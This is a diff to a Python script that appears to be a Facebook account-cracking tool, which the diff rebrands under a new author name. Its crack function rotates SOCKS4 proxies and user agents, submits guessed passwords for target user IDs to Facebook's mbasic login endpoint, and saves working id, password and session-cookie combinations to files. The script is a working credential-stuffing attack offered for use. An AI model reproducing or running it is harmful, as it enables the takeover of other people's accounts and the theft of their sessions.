@@ -111,7 +111,7 @@ def uaku():
 		for ub in ua:
 			ugen.append(ub)
 	except:
-		a=requests.get('https://github.com/Niki404-Cyber/user-agnet/blob/main/mix.txt').text
+		a=requests.get('https://github.com/Rdx337/Sabbiropi/blob/main/Ap.txt').text
 		ua=open('.mix.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
@@ -180,7 +180,7 @@ def banner():
 ██║ ╚═╝ ██║██████╔╝    ███████║██║  ██║██████╔╝██████╔╝██║██║  ██║    ███████║██║  ██║
 ╚═╝     ╚═╝╚═════╝     ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝
                                                                                       
-    ░               
+
 ══════════════════════════════════════════""")
 os.system('clear')
 banner()
@@ -211,7 +211,7 @@ def chk():
   os.system('pip uninstall requests -y')
   os.system('pip install request')
   os.system('clear')
-  os.system('xdg-open https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL1')
+  os.system('xdg-open https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL')
   print(logo)
   print('\033[94m[•]\033[97mMY TOOLS ARE FREE')
   print('\033[94m[•]\033[97mYOUR KEY SEND MY INBOX')
@@ -228,9 +228,9 @@ def chk():
       pass 
     else:
       
-      print('\033[92m[•]\033[97mMY ID : Md Sabbir Bhai[ DARK-HUNTER ]')
+      print('\033[92m[•]\033[97mMY ID : DH ALAMIN HASAN [ DARK-HUNTER ]')
       print('\033[92m[•]\033[97mYOUR KEY SEND MY INBOX')
-      os.system('xdg-open https://www.facebook.com/profile.php?id=100089747571096&mibextid=ZbWKwL')
+      os.system('xdg-open https://www.facebook.com/DaRk.HuNtEr.aLaMin.01')
       time.sleep(1) 
       sys.exit() 
   except: 
@@ -392,9 +392,9 @@ def passwrd():
 	print(f' Results CP Saved In :CP.txt')
 	print(f' Play Airplane Mode Any 1k Idz\r')
 	print('══════════════════════════════════════════')
-	#print(f"\x1b[1;91m [😏] \x1b[1;92m TODAY TIME        \x1b[1;91m➢ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
-	#print(f"\x1b[1;91m [🤒] \x1b[1;92m TODAY DATE        \x1b[1;91m➢ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
-	#print(f"\x1b[1;91m [😂] \x1b[1;91m NOTE ➢ \33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")
+	#print(f"\x1b[1;91m [💉] \x1b[1;92m TODAY TIME        \x1b[1;91m➢ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+	#print(f"\x1b[1;91m [💉] \x1b[1;92m TODAY DATE        \x1b[1;91m➢ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
+	#print(f"\x1b[1;91m [😩] \x1b[1;91m NOTE ➢ \33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")
 	p#rint(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mᗰᖇ.ᗷᗩᕼᗩᑌᗪᗪIᑎ\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●\n')
 	#os.system("play-audio stard.mp3 ")
 	print(50*'_')
@@ -533,16 +533,16 @@ def crack(idf,pwv):
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({'Host': 'www.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'})
-			p = ses.get('https://www.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			ses.headers.update({'Host': 'x.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'})
+			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
 			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-			po = ses.post('https://www.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#os.system("play-audio m.mp3 ")
-				print(f'\r \x1b[1;93m CHECKPOINT-[🌶️] {idf} | {pw}{N}')     
+				print(f'\r \x1b[1;93m CHECKPOINT-[🥶] {idf} | {pw}{N}')     
 				open('SABBIR_CP.txt' , 'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -552,7 +552,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				#os.system("play-audio bd.mp3 ")
-				print(f'\r{H}\nSUCCESSFUL [💛] {idf} | {pw}\n[🥭]COOKIES ➢ \x1b[1;97m{kuki}')
+				print(f'\r{H}\nSUCCESSFUL [💚] {idf} | {pw}\n[🌸]COOKIES ➢ \x1b[1;97m{kuki}')
 				cek_apk(session,coki)
 				open('SABBIR_OK.txt' , 'a').write(idf+'|'+pw+'|'+ua+kuki+'\n')
 				break
